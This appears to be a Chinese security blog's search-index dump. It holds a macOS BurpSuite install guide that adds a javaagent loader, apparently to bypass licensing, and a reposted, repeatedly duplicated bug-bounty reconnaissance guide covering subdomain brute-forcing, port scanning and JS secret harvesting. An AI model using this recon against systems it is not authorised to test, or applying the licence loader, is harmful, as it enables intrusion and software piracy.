[{"categories":["工具"],"content":" 下载BurpSuite 注册启动汉化 ","date":"2023-12-03","objectID":"/macos%E5%AE%89%E8%A3%85burpsuite/:0:0","series":null,"tags":["BurpSuite"],"title":"安装BurpSuite","uri":"/macos%E5%AE%89%E8%A3%85burpsuite/#下载"},{"categories":["工具"],"content":" 安装 安装完成后先启动一次burp，然后关闭，否则会报错损坏。 在应用程序中找到BurpSuite右键显示包内容，依次打开 ./Contents/Resources/app，把启动器放入其中。 返回到Contents目录，编辑vmoptions.txt，末尾追加内容 、、、txt –add-opens=java.base/java.lang=ALL-UNNAMED –add-opens=java.base/jdk.internal.org.objectweb.asm=ALL-UNNAMED –add-opens=java.base/jdk.internal.org.objectweb.asm.tree=ALL-UNNAMED –add-opens=java.base/jdk.internal.org.objectweb.asm.Opcodes=ALL-UNNAMED -javaagent:burpsuitloader-all.jar -noverify 、、、 ","date":"2023-12-03","objectID":"/macos%E5%AE%89%E8%A3%85burpsuite/:0:0","series":null,"tags":["BurpSuite"],"title":"安装BurpSuite","uri":"/macos%E5%AE%89%E8%A3%85burpsuite/#安装"},{"categories":["学习"],"content":" 转载自： https://xz.aliyun.com/t/8501 一个SRC混子挖SRC的半年经验分享~,基本都是文字阐述，希望能给同样在挖洞的师傅们带来一点新收获。 ","date":"2023-11-30","objectID":"/src%E6%B7%B7%E5%AD%90%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8B%E9%81%93/:0:0","series":null,"tags":["技能"],"title":"SRC混子的漏洞挖掘之道","uri":"/src%E6%B7%B7%E5%AD%90%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8B%E9%81%93/#"},{"categories":["学习"],"content":" 前期信息收集还是那句老话,渗透测试的本质是信息收集，对于没有0day的弱鸡选手来说，挖SRC感觉更像是对企业的资产梳理，我们往往需要花很长的时间去做信息收集，收集与此公司相关的信息，包括企业的分公司，全资子公司，网站域名、手机app,微信小程序，企业专利品牌信息，企业邮箱，电话等等，对于很多万人挖的src来说，你收集到了别人没有收集过的资产，往往离挖到漏洞就不远了。 企业相关信息收集 企查查 (https://www.qcc.com）/) 天眼查(https://www.tianyancha.com/) 启信宝（https://www.qixin.com/) 企查查、天眼查淘宝都有那种一天的会员。对于我们信息收集其实已经够用，个人更喜欢用企查查，因为它能一键导出域名，还可以直接查看企业关联的子公司，比较方便。 主要查询的信息: 一般大的src都有许多子公司,企查查可以在所属集团中查看该集团下子公司，并且可以导出。 查看同电话企业基本都是子公司。 查看股份穿透图，一般来说控股超过50%的子公司的漏洞SRC收录的可能性都比较大。 查看企业下的app、小程序、还有品牌的资产，直接在搜索引擎里搜索品牌可能会有意想不到的收获。（找到一些平常收集不到的资产) PS:一般来说100%的全资子公司src漏洞是一定会收的，其他子公司资产可能需要与src审核沟通（扯皮)。 站长之家:http://whois.chinaz.com/ 邮箱反查、注册人反查、电话反查。 推荐个项目:https://github.com/code-scan/BroDomain 兄弟域名查询。 https://www.qimai.cn/ 七麦数据，可以查到企业下一些比较冷门的app。 信息整理 当我们通过各种手段对挖掘的企业进行信息收集后，我们大致能得到以下有用的信息 主公司及分公司、子公司下所有归属的网站域名信息； 主公司及分公司、子公司下所有的专利品牌和开发的一些独立系统。 主公司及分公司、子公司下所有的app资产和微信小程序。 之后我们需要对这些信息进行归纳和整理,比如哪些是该公司的主资产，哪些是边缘资产，哪些资产看上去比较冷门，我们是可以重点关注和进行深入挖掘的。 子域名收集和网站信息收集子域名的话，对于我来说oneforall和xray的功能已经足够强大了，对于一些主域名来说，如果想要充分的收集子域名，最好用特大号字典进行最少三层的子域名爆破。这块还是layer子域名挖掘机不错。 通过github收集子域名先分享一个姿势，很多时候github上已经有热心的师傅分享了自己跑出的子域名，所以可以先到github找一找有没有现成的可以白嫖，没啥好语法，纯靠大海捞针。。 oneforAllhttps://github.com/shmilylty/OneForAll 需要到配置文件里填写api接口信息， 根据需求修改其他的配置，比如可以配置一些常见的端口，当做简单的端口扫描工具用。 命令 python oneforall.py --targets ./domain.txt run python oneforall.py --targets ./domain.txt --brute true run 我实际操作发现在挂了外网代理和没挂代理时跑出来的子域有时候差的有点大，想收集的全一点的师傅可以不挂代理和挂代理都跑一遍。然后去重一下。 xray子域名探测需要高级版，可以自己写个十几行的代码进行批量探测，也可以直接用这个项目里的代码， https://github.com/timwhitez/rad-xray 命令改一下能批量探测子域名，一般5到10分钟一个子域。 Goby官网:https://gobies.org/ 因为之前一直在用masscan+nmap的方式进行端口扫描，用这个项目:https://github.com/hellogoldsnakeman/masnmapscan-V1.0 前一段时间接触到goby，感觉可视化的工具用起来还是舒服，可以短时间对一些常见端口进行扫描，还能对网站进行指纹识别，报告看起来挺舒服的。 因为在实际的端口扫描过程，由于cdn或者防火墙的原因，所以没必要一上来就全端口扫描，听一位师傅分享的经验，比如当扫描到22端口开放时，说明这个ip没有cdn保护，对于这种ip我们可以提取出来，然后重点进行全端口扫描，有收获的可能性会比较大。 BBScan猪猪侠师傅写的工具，速度很快，简单的目录扫描，主要是可以探测C段下面的很多资产，扩充攻击面。 项目地址: https://github.com/lijiejie/BBScan https://github.com/yhy0/BBScan （添加了springboot的泄露探测） 可以对域名、ip、C段进行探测 快速探测管理后台 进行端口探测 探测敏感信息泄露 可以自定义扫描规则 report下看报告,误报肯定会很多，但C段下很可能会有意想不到的资产。 js信息收集主要是爬取网站的敏感js文件，js中能收集到的信息: 增加攻击面(url、域名) 敏感信息(密码、API密钥、加密方式) 代码中的潜在危险函数操作 具有已知漏洞的框架 常用的工具 速度很快的jsfinder https://github.com/Threezh1/JSFinder xray的rad爬虫 https://github.com/chaitin/rad 能够匹配敏感信息的JSINFO-SCAN：https://github.com/p1g3/JSINFO-SCAN ","date":"2023-11-30","objectID":"/src%E6%B7%B7%E5%AD%90%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8B%E9%81%93/:0:1","series":null,"tags":["技能"],"title":"SRC混子的漏洞挖掘之道","uri":"/src%E6%B7%B7%E5%AD%90%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8B%E9%81%93/#前期信息收集"},{"categories":["学习"],"content":" 前期信息收集还是那句老话,渗透测试的本质是信息收集，对于没有0day的弱鸡选手来说，挖SRC感觉更像是对企业的资产梳理，我们往往需要花很长的时间去做信息收集，收集与此公司相关的信息，包括企业的分公司，全资子公司，网站域名、手机app,微信小程序，企业专利品牌信息，企业邮箱，电话等等，对于很多万人挖的src来说，你收集到了别人没有收集过的资产，往往离挖到漏洞就不远了。 企业相关信息收集 企查查 (https://www.qcc.com）/) 天眼查(https://www.tianyancha.com/) 启信宝（https://www.qixin.com/) 企查查、天眼查淘宝都有那种一天的会员。对于我们信息收集其实已经够用，个人更喜欢用企查查，因为它能一键导出域名，还可以直接查看企业关联的子公司，比较方便。 主要查询的信息: 一般大的src都有许多子公司,企查查可以在所属集团中查看该集团下子公司，并且可以导出。 查看同电话企业基本都是子公司。 查看股份穿透图，一般来说控股超过50%的子公司的漏洞SRC收录的可能性都比较大。 查看企业下的app、小程序、还有品牌的资产，直接在搜索引擎里搜索品牌可能会有意想不到的收获。（找到一些平常收集不到的资产) PS:一般来说100%的全资子公司src漏洞是一定会收的，其他子公司资产可能需要与src审核沟通（扯皮)。 站长之家:http://whois.chinaz.com/ 邮箱反查、注册人反查、电话反查。 推荐个项目:https://github.com/code-scan/BroDomain 兄弟域名查询。 https://www.qimai.cn/ 七麦数据，可以查到企业下一些比较冷门的app。 信息整理 当我们通过各种手段对挖掘的企业进行信息收集后，我们大致能得到以下有用的信息 主公司及分公司、子公司下所有归属的网站域名信息； 主公司及分公司、子公司下所有的专利品牌和开发的一些独立系统。 主公司及分公司、子公司下所有的app资产和微信小程序。 之后我们需要对这些信息进行归纳和整理,比如哪些是该公司的主资产，哪些是边缘资产，哪些资产看上去比较冷门，我们是可以重点关注和进行深入挖掘的。 子域名收集和网站信息收集子域名的话，对于我来说oneforall和xray的功能已经足够强大了，对于一些主域名来说，如果想要充分的收集子域名，最好用特大号字典进行最少三层的子域名爆破。这块还是layer子域名挖掘机不错。 通过github收集子域名先分享一个姿势，很多时候github上已经有热心的师傅分享了自己跑出的子域名，所以可以先到github找一找有没有现成的可以白嫖，没啥好语法，纯靠大海捞针。。 oneforAllhttps://github.com/shmilylty/OneForAll 需要到配置文件里填写api接口信息， 根据需求修改其他的配置，比如可以配置一些常见的端口，当做简单的端口扫描工具用。 命令 python oneforall.py --targets ./domain.txt run python oneforall.py --targets ./domain.txt --brute true run 我实际操作发现在挂了外网代理和没挂代理时跑出来的子域有时候差的有点大，想收集的全一点的师傅可以不挂代理和挂代理都跑一遍。然后去重一下。 xray子域名探测需要高级版，可以自己写个十几行的代码进行批量探测，也可以直接用这个项目里的代码， https://github.com/timwhitez/rad-xray 命令改一下能批量探测子域名，一般5到10分钟一个子域。 Goby官网:https://gobies.org/ 因为之前一直在用masscan+nmap的方式进行端口扫描，用这个项目:https://github.com/hellogoldsnakeman/masnmapscan-V1.0 前一段时间接触到goby，感觉可视化的工具用起来还是舒服，可以短时间对一些常见端口进行扫描，还能对网站进行指纹识别，报告看起来挺舒服的。 因为在实际的端口扫描过程，由于cdn或者防火墙的原因，所以没必要一上来就全端口扫描，听一位师傅分享的经验，比如当扫描到22端口开放时，说明这个ip没有cdn保护，对于这种ip我们可以提取出来，然后重点进行全端口扫描，有收获的可能性会比较大。 BBScan猪猪侠师傅写的工具，速度很快，简单的目录扫描，主要是可以探测C段下面的很多资产，扩充攻击面。 项目地址: https://github.com/lijiejie/BBScan https://github.com/yhy0/BBScan （添加了springboot的泄露探测） 可以对域名、ip、C段进行探测 快速探测管理后台 进行端口探测 探测敏感信息泄露 可以自定义扫描规则 report下看报告,误报肯定会很多，但C段下很可能会有意想不到的资产。 js信息收集主要是爬取网站的敏感js文件，js中能收集到的信息: 增加攻击面(url、域名) 敏感信息(密码、API密钥、加密方式) 代码中的潜在危险函数操作 具有已知漏洞的框架 常用的工具 速度很快的jsfinder https://github.com/Threezh1/JSFinder xray的rad爬虫 https://github.com/chaitin/rad 能够匹配敏感信息的JSINFO-SCAN：https://github.com/p1g3/JSINFO-SCAN ","date":"2023-11-30","objectID":"/src%E6%B7%B7%E5%AD%90%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8B%E9%81%93/:0:1","series":null,"tags":["技能"],"title":"SRC混子的漏洞挖掘之道","uri":"/src%E6%B7%B7%E5%AD%90%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8B%E9%81%93/#企业相关信息收集"},{"categories":["学习"],"content":" 前期信息收集还是那句老话,渗透测试的本质是信息收集，对于没有0day的弱鸡选手来说，挖SRC感觉更像是对企业的资产梳理，我们往往需要花很长的时间去做信息收集，收集与此公司相关的信息，包括企业的分公司，全资子公司，网站域名、手机app,微信小程序，企业专利品牌信息，企业邮箱，电话等等，对于很多万人挖的src来说，你收集到了别人没有收集过的资产，往往离挖到漏洞就不远了。 企业相关信息收集 企查查 (https://www.qcc.com）/) 天眼查(https://www.tianyancha.com/) 启信宝（https://www.qixin.com/) 企查查、天眼查淘宝都有那种一天的会员。对于我们信息收集其实已经够用，个人更喜欢用企查查，因为它能一键导出域名，还可以直接查看企业关联的子公司，比较方便。 主要查询的信息: 一般大的src都有许多子公司,企查查可以在所属集团中查看该集团下子公司，并且可以导出。 查看同电话企业基本都是子公司。 查看股份穿透图，一般来说控股超过50%的子公司的漏洞SRC收录的可能性都比较大。 查看企业下的app、小程序、还有品牌的资产，直接在搜索引擎里搜索品牌可能会有意想不到的收获。（找到一些平常收集不到的资产) PS:一般来说100%的全资子公司src漏洞是一定会收的，其他子公司资产可能需要与src审核沟通（扯皮)。 站长之家:http://whois.chinaz.com/ 邮箱反查、注册人反查、电话反查。 推荐个项目:https://github.com/code-scan/BroDomain 兄弟域名查询。 https://www.qimai.cn/ 七麦数据，可以查到企业下一些比较冷门的app。 信息整理 当我们通过各种手段对挖掘的企业进行信息收集后，我们大致能得到以下有用的信息 主公司及分公司、子公司下所有归属的网站域名信息； 主公司及分公司、子公司下所有的专利品牌和开发的一些独立系统。 主公司及分公司、子公司下所有的app资产和微信小程序。 之后我们需要对这些信息进行归纳和整理,比如哪些是该公司的主资产，哪些是边缘资产，哪些资产看上去比较冷门，我们是可以重点关注和进行深入挖掘的。 子域名收集和网站信息收集子域名的话，对于我来说oneforall和xray的功能已经足够强大了，对于一些主域名来说，如果想要充分的收集子域名，最好用特大号字典进行最少三层的子域名爆破。这块还是layer子域名挖掘机不错。 通过github收集子域名先分享一个姿势，很多时候github上已经有热心的师傅分享了自己跑出的子域名，所以可以先到github找一找有没有现成的可以白嫖，没啥好语法，纯靠大海捞针。。 oneforAllhttps://github.com/shmilylty/OneForAll 需要到配置文件里填写api接口信息， 根据需求修改其他的配置，比如可以配置一些常见的端口，当做简单的端口扫描工具用。 命令 python oneforall.py --targets ./domain.txt run python oneforall.py --targets ./domain.txt --brute true run 我实际操作发现在挂了外网代理和没挂代理时跑出来的子域有时候差的有点大，想收集的全一点的师傅可以不挂代理和挂代理都跑一遍。然后去重一下。 xray子域名探测需要高级版，可以自己写个十几行的代码进行批量探测，也可以直接用这个项目里的代码， https://github.com/timwhitez/rad-xray 命令改一下能批量探测子域名，一般5到10分钟一个子域。 Goby官网:https://gobies.org/ 因为之前一直在用masscan+nmap的方式进行端口扫描，用这个项目:https://github.com/hellogoldsnakeman/masnmapscan-V1.0 前一段时间接触到goby，感觉可视化的工具用起来还是舒服，可以短时间对一些常见端口进行扫描，还能对网站进行指纹识别，报告看起来挺舒服的。 因为在实际的端口扫描过程，由于cdn或者防火墙的原因，所以没必要一上来就全端口扫描，听一位师傅分享的经验，比如当扫描到22端口开放时，说明这个ip没有cdn保护，对于这种ip我们可以提取出来，然后重点进行全端口扫描，有收获的可能性会比较大。 BBScan猪猪侠师傅写的工具，速度很快，简单的目录扫描，主要是可以探测C段下面的很多资产，扩充攻击面。 项目地址: https://github.com/lijiejie/BBScan https://github.com/yhy0/BBScan （添加了springboot的泄露探测） 可以对域名、ip、C段进行探测 快速探测管理后台 进行端口探测 探测敏感信息泄露 可以自定义扫描规则 report下看报告,误报肯定会很多，但C段下很可能会有意想不到的资产。 js信息收集主要是爬取网站的敏感js文件，js中能收集到的信息: 增加攻击面(url、域名) 敏感信息(密码、API密钥、加密方式) 代码中的潜在危险函数操作 具有已知漏洞的框架 常用的工具 速度很快的jsfinder https://github.com/Threezh1/JSFinder xray的rad爬虫 https://github.com/chaitin/rad 能够匹配敏感信息的JSINFO-SCAN：https://github.com/p1g3/JSINFO-SCAN ","date":"2023-11-30","objectID":"/src%E6%B7%B7%E5%AD%90%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8B%E9%81%93/:0:1","series":null,"tags":["技能"],"title":"SRC混子的漏洞挖掘之道","uri":"/src%E6%B7%B7%E5%AD%90%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8B%E9%81%93/#子域名收集和网站信息收集"},{"categories":["学习"],"content":" 前期信息收集还是那句老话,渗透测试的本质是信息收集，对于没有0day的弱鸡选手来说，挖SRC感觉更像是对企业的资产梳理，我们往往需要花很长的时间去做信息收集，收集与此公司相关的信息，包括企业的分公司，全资子公司，网站域名、手机app,微信小程序，企业专利品牌信息，企业邮箱，电话等等，对于很多万人挖的src来说，你收集到了别人没有收集过的资产，往往离挖到漏洞就不远了。 企业相关信息收集 企查查 (https://www.qcc.com）/) 天眼查(https://www.tianyancha.com/) 启信宝（https://www.qixin.com/) 企查查、天眼查淘宝都有那种一天的会员。对于我们信息收集其实已经够用，个人更喜欢用企查查，因为它能一键导出域名，还可以直接查看企业关联的子公司，比较方便。 主要查询的信息: 一般大的src都有许多子公司,企查查可以在所属集团中查看该集团下子公司，并且可以导出。 查看同电话企业基本都是子公司。 查看股份穿透图，一般来说控股超过50%的子公司的漏洞SRC收录的可能性都比较大。 查看企业下的app、小程序、还有品牌的资产，直接在搜索引擎里搜索品牌可能会有意想不到的收获。（找到一些平常收集不到的资产) PS:一般来说100%的全资子公司src漏洞是一定会收的，其他子公司资产可能需要与src审核沟通（扯皮)。 站长之家:http://whois.chinaz.com/ 邮箱反查、注册人反查、电话反查。 推荐个项目:https://github.com/code-scan/BroDomain 兄弟域名查询。 https://www.qimai.cn/ 七麦数据，可以查到企业下一些比较冷门的app。 信息整理 当我们通过各种手段对挖掘的企业进行信息收集后，我们大致能得到以下有用的信息 主公司及分公司、子公司下所有归属的网站域名信息； 主公司及分公司、子公司下所有的专利品牌和开发的一些独立系统。 主公司及分公司、子公司下所有的app资产和微信小程序。 之后我们需要对这些信息进行归纳和整理,比如哪些是该公司的主资产，哪些是边缘资产，哪些资产看上去比较冷门，我们是可以重点关注和进行深入挖掘的。 子域名收集和网站信息收集子域名的话，对于我来说oneforall和xray的功能已经足够强大了，对于一些主域名来说，如果想要充分的收集子域名，最好用特大号字典进行最少三层的子域名爆破。这块还是layer子域名挖掘机不错。 通过github收集子域名先分享一个姿势，很多时候github上已经有热心的师傅分享了自己跑出的子域名，所以可以先到github找一找有没有现成的可以白嫖，没啥好语法，纯靠大海捞针。。 oneforAllhttps://github.com/shmilylty/OneForAll 需要到配置文件里填写api接口信息， 根据需求修改其他的配置，比如可以配置一些常见的端口，当做简单的端口扫描工具用。 命令 python oneforall.py --targets ./domain.txt run python oneforall.py --targets ./domain.txt --brute true run 我实际操作发现在挂了外网代理和没挂代理时跑出来的子域有时候差的有点大，想收集的全一点的师傅可以不挂代理和挂代理都跑一遍。然后去重一下。 xray子域名探测需要高级版，可以自己写个十几行的代码进行批量探测，也可以直接用这个项目里的代码， https://github.com/timwhitez/rad-xray 命令改一下能批量探测子域名，一般5到10分钟一个子域。 Goby官网:https://gobies.org/ 因为之前一直在用masscan+nmap的方式进行端口扫描，用这个项目:https://github.com/hellogoldsnakeman/masnmapscan-V1.0 前一段时间接触到goby，感觉可视化的工具用起来还是舒服，可以短时间对一些常见端口进行扫描，还能对网站进行指纹识别，报告看起来挺舒服的。 因为在实际的端口扫描过程，由于cdn或者防火墙的原因，所以没必要一上来就全端口扫描，听一位师傅分享的经验，比如当扫描到22端口开放时，说明这个ip没有cdn保护，对于这种ip我们可以提取出来，然后重点进行全端口扫描，有收获的可能性会比较大。 BBScan猪猪侠师傅写的工具，速度很快，简单的目录扫描，主要是可以探测C段下面的很多资产，扩充攻击面。 项目地址: https://github.com/lijiejie/BBScan https://github.com/yhy0/BBScan （添加了springboot的泄露探测） 可以对域名、ip、C段进行探测 快速探测管理后台 进行端口探测 探测敏感信息泄露 可以自定义扫描规则 report下看报告,误报肯定会很多，但C段下很可能会有意想不到的资产。 js信息收集主要是爬取网站的敏感js文件，js中能收集到的信息: 增加攻击面(url、域名) 敏感信息(密码、API密钥、加密方式) 代码中的潜在危险函数操作 具有已知漏洞的框架 常用的工具 速度很快的jsfinder https://github.com/Threezh1/JSFinder xray的rad爬虫 https://github.com/chaitin/rad 能够匹配敏感信息的JSINFO-SCAN：https://github.com/p1g3/JSINFO-SCAN ","date":"2023-11-30","objectID":"/src%E6%B7%B7%E5%AD%90%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8B%E9%81%93/:0:1","series":null,"tags":["技能"],"title":"SRC混子的漏洞挖掘之道","uri":"/src%E6%B7%B7%E5%AD%90%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8B%E9%81%93/#通过github收集子域名"},{"categories":["学习"],"content":" 前期信息收集还是那句老话,渗透测试的本质是信息收集，对于没有0day的弱鸡选手来说，挖SRC感觉更像是对企业的资产梳理，我们往往需要花很长的时间去做信息收集，收集与此公司相关的信息，包括企业的分公司，全资子公司，网站域名、手机app,微信小程序，企业专利品牌信息，企业邮箱，电话等等，对于很多万人挖的src来说，你收集到了别人没有收集过的资产，往往离挖到漏洞就不远了。 企业相关信息收集 企查查 (https://www.qcc.com）/) 天眼查(https://www.tianyancha.com/) 启信宝（https://www.qixin.com/) 企查查、天眼查淘宝都有那种一天的会员。对于我们信息收集其实已经够用，个人更喜欢用企查查，因为它能一键导出域名，还可以直接查看企业关联的子公司，比较方便。 主要查询的信息: 一般大的src都有许多子公司,企查查可以在所属集团中查看该集团下子公司，并且可以导出。 查看同电话企业基本都是子公司。 查看股份穿透图，一般来说控股超过50%的子公司的漏洞SRC收录的可能性都比较大。 查看企业下的app、小程序、还有品牌的资产，直接在搜索引擎里搜索品牌可能会有意想不到的收获。（找到一些平常收集不到的资产) PS:一般来说100%的全资子公司src漏洞是一定会收的，其他子公司资产可能需要与src审核沟通（扯皮)。 站长之家:http://whois.chinaz.com/ 邮箱反查、注册人反查、电话反查。 推荐个项目:https://github.com/code-scan/BroDomain 兄弟域名查询。 https://www.qimai.cn/ 七麦数据，可以查到企业下一些比较冷门的app。 信息整理 当我们通过各种手段对挖掘的企业进行信息收集后，我们大致能得到以下有用的信息 主公司及分公司、子公司下所有归属的网站域名信息； 主公司及分公司、子公司下所有的专利品牌和开发的一些独立系统。 主公司及分公司、子公司下所有的app资产和微信小程序。 之后我们需要对这些信息进行归纳和整理,比如哪些是该公司的主资产，哪些是边缘资产，哪些资产看上去比较冷门，我们是可以重点关注和进行深入挖掘的。 子域名收集和网站信息收集子域名的话，对于我来说oneforall和xray的功能已经足够强大了，对于一些主域名来说，如果想要充分的收集子域名，最好用特大号字典进行最少三层的子域名爆破。这块还是layer子域名挖掘机不错。 通过github收集子域名先分享一个姿势，很多时候github上已经有热心的师傅分享了自己跑出的子域名，所以可以先到github找一找有没有现成的可以白嫖，没啥好语法，纯靠大海捞针。。 oneforAllhttps://github.com/shmilylty/OneForAll 需要到配置文件里填写api接口信息， 根据需求修改其他的配置，比如可以配置一些常见的端口，当做简单的端口扫描工具用。 命令 python oneforall.py --targets ./domain.txt run python oneforall.py --targets ./domain.txt --brute true run 我实际操作发现在挂了外网代理和没挂代理时跑出来的子域有时候差的有点大，想收集的全一点的师傅可以不挂代理和挂代理都跑一遍。然后去重一下。 xray子域名探测需要高级版，可以自己写个十几行的代码进行批量探测，也可以直接用这个项目里的代码， https://github.com/timwhitez/rad-xray 命令改一下能批量探测子域名，一般5到10分钟一个子域。 Goby官网:https://gobies.org/ 因为之前一直在用masscan+nmap的方式进行端口扫描，用这个项目:https://github.com/hellogoldsnakeman/masnmapscan-V1.0 前一段时间接触到goby，感觉可视化的工具用起来还是舒服，可以短时间对一些常见端口进行扫描，还能对网站进行指纹识别，报告看起来挺舒服的。 因为在实际的端口扫描过程，由于cdn或者防火墙的原因，所以没必要一上来就全端口扫描，听一位师傅分享的经验，比如当扫描到22端口开放时，说明这个ip没有cdn保护，对于这种ip我们可以提取出来，然后重点进行全端口扫描，有收获的可能性会比较大。 BBScan猪猪侠师傅写的工具，速度很快，简单的目录扫描，主要是可以探测C段下面的很多资产，扩充攻击面。 项目地址: https://github.com/lijiejie/BBScan https://github.com/yhy0/BBScan （添加了springboot的泄露探测） 可以对域名、ip、C段进行探测 快速探测管理后台 进行端口探测 探测敏感信息泄露 可以自定义扫描规则 report下看报告,误报肯定会很多，但C段下很可能会有意想不到的资产。 js信息收集主要是爬取网站的敏感js文件，js中能收集到的信息: 增加攻击面(url、域名) 敏感信息(密码、API密钥、加密方式) 代码中的潜在危险函数操作 具有已知漏洞的框架 常用的工具 速度很快的jsfinder https://github.com/Threezh1/JSFinder xray的rad爬虫 https://github.com/chaitin/rad 能够匹配敏感信息的JSINFO-SCAN：https://github.com/p1g3/JSINFO-SCAN ","date":"2023-11-30","objectID":"/src%E6%B7%B7%E5%AD%90%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8B%E9%81%93/:0:1","series":null,"tags":["技能"],"title":"SRC混子的漏洞挖掘之道","uri":"/src%E6%B7%B7%E5%AD%90%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8B%E9%81%93/#oneforall"},{"categories":["学习"],"content":" 前期信息收集还是那句老话,渗透测试的本质是信息收集，对于没有0day的弱鸡选手来说，挖SRC感觉更像是对企业的资产梳理，我们往往需要花很长的时间去做信息收集，收集与此公司相关的信息，包括企业的分公司，全资子公司，网站域名、手机app,微信小程序，企业专利品牌信息，企业邮箱，电话等等，对于很多万人挖的src来说，你收集到了别人没有收集过的资产，往往离挖到漏洞就不远了。 企业相关信息收集 企查查 (https://www.qcc.com）/) 天眼查(https://www.tianyancha.com/) 启信宝（https://www.qixin.com/) 企查查、天眼查淘宝都有那种一天的会员。对于我们信息收集其实已经够用，个人更喜欢用企查查，因为它能一键导出域名，还可以直接查看企业关联的子公司，比较方便。 主要查询的信息: 一般大的src都有许多子公司,企查查可以在所属集团中查看该集团下子公司，并且可以导出。 查看同电话企业基本都是子公司。 查看股份穿透图，一般来说控股超过50%的子公司的漏洞SRC收录的可能性都比较大。 查看企业下的app、小程序、还有品牌的资产，直接在搜索引擎里搜索品牌可能会有意想不到的收获。（找到一些平常收集不到的资产) PS:一般来说100%的全资子公司src漏洞是一定会收的，其他子公司资产可能需要与src审核沟通（扯皮)。 站长之家:http://whois.chinaz.com/ 邮箱反查、注册人反查、电话反查。 推荐个项目:https://github.com/code-scan/BroDomain 兄弟域名查询。 https://www.qimai.cn/ 七麦数据，可以查到企业下一些比较冷门的app。 信息整理 当我们通过各种手段对挖掘的企业进行信息收集后，我们大致能得到以下有用的信息 主公司及分公司、子公司下所有归属的网站域名信息； 主公司及分公司、子公司下所有的专利品牌和开发的一些独立系统。 主公司及分公司、子公司下所有的app资产和微信小程序。 之后我们需要对这些信息进行归纳和整理,比如哪些是该公司的主资产，哪些是边缘资产，哪些资产看上去比较冷门，我们是可以重点关注和进行深入挖掘的。 子域名收集和网站信息收集子域名的话，对于我来说oneforall和xray的功能已经足够强大了，对于一些主域名来说，如果想要充分的收集子域名，最好用特大号字典进行最少三层的子域名爆破。这块还是layer子域名挖掘机不错。 通过github收集子域名先分享一个姿势，很多时候github上已经有热心的师傅分享了自己跑出的子域名，所以可以先到github找一找有没有现成的可以白嫖，没啥好语法，纯靠大海捞针。。 oneforAllhttps://github.com/shmilylty/OneForAll 需要到配置文件里填写api接口信息， 根据需求修改其他的配置，比如可以配置一些常见的端口，当做简单的端口扫描工具用。 命令 python oneforall.py --targets ./domain.txt run python oneforall.py --targets ./domain.txt --brute true run 我实际操作发现在挂了外网代理和没挂代理时跑出来的子域有时候差的有点大，想收集的全一点的师傅可以不挂代理和挂代理都跑一遍。然后去重一下。 xray子域名探测需要高级版，可以自己写个十几行的代码进行批量探测，也可以直接用这个项目里的代码， https://github.com/timwhitez/rad-xray 命令改一下能批量探测子域名，一般5到10分钟一个子域。 Goby官网:https://gobies.org/ 因为之前一直在用masscan+nmap的方式进行端口扫描，用这个项目:https://github.com/hellogoldsnakeman/masnmapscan-V1.0 前一段时间接触到goby，感觉可视化的工具用起来还是舒服，可以短时间对一些常见端口进行扫描，还能对网站进行指纹识别，报告看起来挺舒服的。 因为在实际的端口扫描过程，由于cdn或者防火墙的原因，所以没必要一上来就全端口扫描，听一位师傅分享的经验，比如当扫描到22端口开放时，说明这个ip没有cdn保护，对于这种ip我们可以提取出来，然后重点进行全端口扫描，有收获的可能性会比较大。 BBScan猪猪侠师傅写的工具，速度很快，简单的目录扫描，主要是可以探测C段下面的很多资产，扩充攻击面。 项目地址: https://github.com/lijiejie/BBScan https://github.com/yhy0/BBScan （添加了springboot的泄露探测） 可以对域名、ip、C段进行探测 快速探测管理后台 进行端口探测 探测敏感信息泄露 可以自定义扫描规则 report下看报告,误报肯定会很多，但C段下很可能会有意想不到的资产。 js信息收集主要是爬取网站的敏感js文件，js中能收集到的信息: 增加攻击面(url、域名) 敏感信息(密码、API密钥、加密方式) 代码中的潜在危险函数操作 具有已知漏洞的框架 常用的工具 速度很快的jsfinder https://github.com/Threezh1/JSFinder xray的rad爬虫 https://github.com/chaitin/rad 能够匹配敏感信息的JSINFO-SCAN：https://github.com/p1g3/JSINFO-SCAN ","date":"2023-11-30","objectID":"/src%E6%B7%B7%E5%AD%90%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8B%E9%81%93/:0:1","series":null,"tags":["技能"],"title":"SRC混子的漏洞挖掘之道","uri":"/src%E6%B7%B7%E5%AD%90%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8B%E9%81%93/#xray"},{"categories":["学习"],"content":" 前期信息收集还是那句老话,渗透测试的本质是信息收集，对于没有0day的弱鸡选手来说，挖SRC感觉更像是对企业的资产梳理，我们往往需要花很长的时间去做信息收集，收集与此公司相关的信息，包括企业的分公司，全资子公司，网站域名、手机app,微信小程序，企业专利品牌信息，企业邮箱，电话等等，对于很多万人挖的src来说，你收集到了别人没有收集过的资产，往往离挖到漏洞就不远了。 企业相关信息收集 企查查 (https://www.qcc.com）/) 天眼查(https://www.tianyancha.com/) 启信宝（https://www.qixin.com/) 企查查、天眼查淘宝都有那种一天的会员。对于我们信息收集其实已经够用，个人更喜欢用企查查，因为它能一键导出域名，还可以直接查看企业关联的子公司，比较方便。 主要查询的信息: 一般大的src都有许多子公司,企查查可以在所属集团中查看该集团下子公司，并且可以导出。 查看同电话企业基本都是子公司。 查看股份穿透图，一般来说控股超过50%的子公司的漏洞SRC收录的可能性都比较大。 